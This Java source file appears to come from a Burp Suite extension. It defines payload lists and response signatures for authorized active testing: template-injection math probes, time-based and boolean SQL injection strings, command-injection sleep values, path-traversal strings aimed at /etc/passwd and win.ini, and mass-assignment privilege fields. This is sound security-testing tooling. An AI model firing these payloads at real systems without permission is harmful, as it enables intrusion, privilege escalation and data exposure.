package com.example.burpgemini.hunt;

/** Payload libraries and detection signatures for oracle-based active testing. */
public final class Payloads {

    private Payloads() {
    }

    /** SSTI math oracle — a hit reflects {@code 49}. */
    public static final String[] SSTI = {"{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}"};

    /** ~5s sleep payloads for time-based SQLi across engines. */
    public static final String[] SQLI_TIME = {
            "' OR SLEEP(5)-- -", "'; WAITFOR DELAY '0:0:5'-- -", "\" OR SLEEP(5)-- -",
            "' || pg_sleep(5)-- -", "') OR SLEEP(5)-- -", "1) OR SLEEP(5)-- -",
    };

    /** ~5s sleep payloads for time-based command injection. */
    public static final String[] CMDI_TIME = {
            "; sleep 5", "| sleep 5", "& ping -n 6 127.0.0.1 &", "$(sleep 5)", "`sleep 5`", "%0asleep 5",
    };

    public static final String[] SQLI_BOOL_TRUE = {"' OR '1'='1", "' OR 1=1-- -", "1 OR 1=1"};
    public static final String[] SQLI_BOOL_FALSE = {"' OR '1'='2", "' AND 1=2-- -", "1 AND 1=2"};

    public static final String[] SQLI_ERROR = {"'", "\"", "')", "';", "'\"", "' OR '", "\\"};

    public static final String[] PATH_TRAVERSAL = {
            "../../../../../../etc/passwd", "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd", "../../../../../../windows/win.ini",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    };

    public static final String[] SQL_ERROR_SIGNS = {
            "SQL syntax", "mysql_fetch", "ORA-0", "SQLSTATE", "PostgreSQL", "syntax error at or near",
            "Microsoft OLE DB", "ODBC SQL", "Unclosed quotation mark", "SQLite3::", "org.hibernate",
            "MySqlException", "SqlException", "Warning: mysqli", "quoted string not properly terminated",
    };

    public static final String[] TRAVERSAL_SIGNS = {
            "root:x:0:0", "daemon:x:", "[extensions]", "; for 16-bit app support", "[fonts]",
    };

    /** Dangerous DOM/JS sinks worth flagging in client-side analysis. */
    public static final String[] JS_SINKS = {
            "innerHTML", "outerHTML", "document.write", "eval(", "setTimeout(\"", "setInterval(\"",
            "Function(", "location.href", "location.assign", "location.replace", "insertAdjacentHTML",
            "dangerouslySetInnerHTML", "srcdoc", ".html(", "$(location", "window.name",
    };

    // ---- API testing --------------------------------------------------------

    /** Minimal GraphQL introspection query — a full schema in the response means introspection is on. */
    public static final String GRAPHQL_INTROSPECTION =
            "{\"query\":\"query IntrospectionQuery { __schema { queryType { name } mutationType { name } "
            + "types { name kind } } }\"}";

    /** Signs that a body is a GraphQL response (schema present or a GraphQL-shaped error/envelope). */
    public static final String[] GRAPHQL_SIGNS = {
            "__schema", "queryType", "\"data\"", "\"errors\"", "Cannot query field",
            "GraphQL", "must be defined", "Did you mean",
    };

    /**
     * HTTP methods to try for verb/method-tampering (access-control bypass, unintended write handlers).
     * PUT/DELETE/PATCH can be state-changing, which is exactly why this is authorized-only.
     */
    public static final String[] TAMPER_METHODS = {
            "GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE", "PROPFIND", "FOO",
    };

    /** Method-override headers some frameworks honour (turns a POST into a hidden PUT/DELETE). */
    public static final String[] METHOD_OVERRIDE_HEADERS = {
            "X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override",
    };

    /**
     * Privileged fields to graft onto a write request for mass-assignment / over-posting tests
     * (name -> value). A privilege change that "sticks" in the response is the signal.
     */
    public static final String[][] MASS_ASSIGN_FIELDS = {
            {"role", "admin"}, {"is_admin", "true"}, {"isAdmin", "true"}, {"admin", "true"},
            {"is_superuser", "true"}, {"account_type", "admin"}, {"user_role", "admin"},
            {"privilege", "admin"}, {"is_verified", "true"}, {"verified", "true"},
            {"email_verified", "true"}, {"active", "true"}, {"status", "active"},
            {"balance", "999999"}, {"credit", "999999"}, {"approved", "true"}, {"is_staff", "true"},
    };
}
